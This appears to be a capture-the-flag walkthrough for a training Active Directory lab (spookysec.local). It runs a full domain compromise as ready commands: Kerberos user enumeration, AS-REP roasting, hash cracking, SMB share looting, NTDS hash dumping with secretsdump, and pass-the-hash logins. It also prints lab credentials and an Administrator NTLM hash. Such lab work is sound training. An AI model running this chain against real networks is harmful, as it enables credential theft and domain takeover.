1. Nmap shows port 88 which kerberos service running.
2. We will enumerate the username list provided in the task for the valid usernames with the help of kerberos service on the system.
```
kerbrute userenum -d DOMAIN_NAME --dc DOMAIN_CONTROLLER_IP -o user_wordlists.txt
```

3. Now we have a list of valid usernames returned from the above command. We will check for the possible ASREP roastable account. 
```
impacket-GetNPUsers -dc-ip <Target_IP> <Target_Domain>/ -usersfile <the_selected_users_list> 
```
4. Crack the krb hash with with john or hashcat
```
hashcat -a 0 -m 18200 hash password.txt # -a straight mode

john --wordlist=password.txt hash
```
5. Now we have 1 valid credentials pair which we can use to enumerate smb.
```
smbclient -L //10.10.253.224 -U svc-admin%management2005

nxc smb 10.10.253.224 -u svc-admin -p management2005 --shares

smbmap -H 10.10.253.224 -u svc-admin -p management2005
```
6. We can see a non standard share name backup with read permission.
7. Found a backup file with creds of the backup user.
```
cat backup_credentials.txt
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

Cracked the text with cyberchef and got the crdes.
> backup@spookysec.local:backup2517860	
```
8.  As mentioned on the task the backup user has special permission to sync the changes on the backup. Also we found the user is part of local administrator group by login via RDP.
9. Used the impacket-secretsdump to dump the ntds.dit hashes of all users. Where we got the administrator NTLM hash.
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```
10. Used the hash for pass the hash to login with psexec or evil-winrm.
```
impacket-psexec spookysec.local/administrator@10.10.253.224 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc

evil-winrm -i 10.10.253.224 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
```

![[Pasted image 20241202151005.png]]

![[Pasted image 20241202151038.png]]
